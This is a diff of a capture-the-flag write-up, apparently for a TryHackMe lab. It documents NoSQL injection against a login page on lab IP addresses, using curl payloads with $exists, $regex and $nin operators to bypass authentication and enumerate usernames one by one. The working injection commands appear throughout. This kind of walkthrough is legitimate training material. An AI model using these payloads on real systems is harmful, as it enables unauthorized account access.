@@ -321,12 +321,17 @@ This time we get a response telling us that the username or password are incorre
               </div>
 ```
 
+Well what to do next - we can send data to the server for processing but we don't seem to have the proper username and password that we need to use.  What followed here was a lot of trial and error and going round in circles until I decided to try some NoSQLi techniques - I used the following as a great refernce to get started: https://book.hacktricks.xyz/pentesting-web/nosql-injection
 
-
+The following `curl` command effictively matches to the first user in the database that has a non-null username and password:
 
 ```
-$ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.188.58:8080/login.php -X POST -d 'username[$regex]=.*&password[$regex]=.*' -c cookie.txt -L
-$ 
+$ curl -s -u 'admin:Y3tiStarCur!ouspassword=admin' http://10.10.188.58:8080/login.php -X POST -d 'username[$exists]=true&password[$exists]=true' -c cookie.txt -L
+```
+
+And it works!  we're now presented with a different HTML which includes the message **Welcome Frostbite**.
+
+``` 
 <!DOCTYPE html>
 <html lang="en" class="h-full bg-thm-800">
 
@@ -345,17 +350,21 @@ $
 
 ...
 ```
+It would appear that the first username in the database is `Frostbite` but his dashboard is mostly empty and we have no useful information, so maybe we can start looking into what other usernames are available and what they have on their dashboard.
+
+To do this I modified the `curl` command I used earlier to now exclude the username `Frostbite` and match on the next available one:
+
 ```
 curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.1.6:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&password[$regex]=.*' -L -c cookie
 ```
-**Welcome `Snowballer`**
 
-```
-curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.111.200:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&username[$nin][1]=Snowballer&username[$nin][2]=Slushinski&username[$nin][3]=Blizzardson&username[$nin][4]=Tinseltooth&username[$nin][5]=Snowbacca&username[$nin][6]=Grinchowski&username[$nin][7]=Scroogestein&username[$nin][8]=Sleighburn&username[$nin][9]=Northpolinsky&username[$nin][10]=Frostington&username[$nin][11]=Tinselova&username[$nin][12]=Frostova&username[$nin][13]=Iciclevich&username[$nin][14]=Frostopoulos&username[$nin][15]=Grinchenko&username[$nin][16]=Snownandez&password[$exists]=true' -L -c cookie -w 'Size: %{size_download}\n' | grep -e Welcome -e Size
+This time we see the message **Welcome `Snowballer`**, but again not much else.  
 
-          <h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frosteau!</h1>
-Size: 13899
-```
+What comes next is a painstaking bit of repetitive trial and error which probably could have been automated but I would then have had to figure out how to break out of the shell on the IP camera or extablish some kind of proxy - which I couldn't be bothered with.
+
+I kept adding each new username I found to the `curl` command as yet another name to be excluded.  To keep thigns more manageable I added the switch `-w 'Size: %{size_download}\n` to the command so that I could easily see if there was a significant change in the size of the retrieved data from one username to the next.  I also added a `| grep -e Welcome -e Size` so that for each new `curl` command I tried I would only get an output showing the Welcome message with the newly discovered username and the size of the retrieved data.
+
+Finally after 18 iterations of the `curl` command I enumarted the following usernames:
 ```
 Frostbite
 Snowballer
@@ -376,6 +385,23 @@ Grinchenko
 Snownandez
 Frosteau
 ```
+It was not possible to retrieve any further usernames, so I am assuming that this list is comprehensive, but nevertheless the `curl` request that returned `Frosteau` had a significantly larger file size - so that is most probably the user we should be looking at.
+
+The final curl command I used was:
+
+```
+curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.111.200:8080/login.php -X POST -d 'username[$nin][0]=Frostbite&username[$nin][1]=Snowballer&username[$nin][2]=Slushinski&username[$nin][3]=Blizzardson&username[$nin][4]=Tinseltooth&username[$nin][5]=Snowbacca&username[$nin][6]=Grinchowski&username[$nin][7]=Scroogestein&username[$nin][8]=Sleighburn&username[$nin][9]=Northpolinsky&username[$nin][10]=Frostington&username[$nin][11]=Tinselova&username[$nin][12]=Frostova&username[$nin][13]=Iciclevich&username[$nin][14]=Frostopoulos&username[$nin][15]=Grinchenko&username[$nin][16]=Snownandez&password[$exists]=true' -L -c cookie -w 'Size: %{size_download}\n' | grep -e Welcome -e Size
+```
+
+And now that we know that we're interestign in retrieving `Frosteau`'s dashboard we can clean this up to the following:
+```
+curl -u 'admin:Y3tiStarCur!ouspassword=admin' -s http://10.10.111.200:8080/login.php -X POST -d 'username=Frosteau&password[$exists]=true' -L -c cookie 
+```
+
+          <h1 class="text-3xl font-bold leading-tight text-center text-gray-100 ">Welcome Frosteau!</h1>
+Size: 13899
+```
+
 
 ![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/4cdaa093-1b60-4fc3-a61d-63c7f4121f08)
 
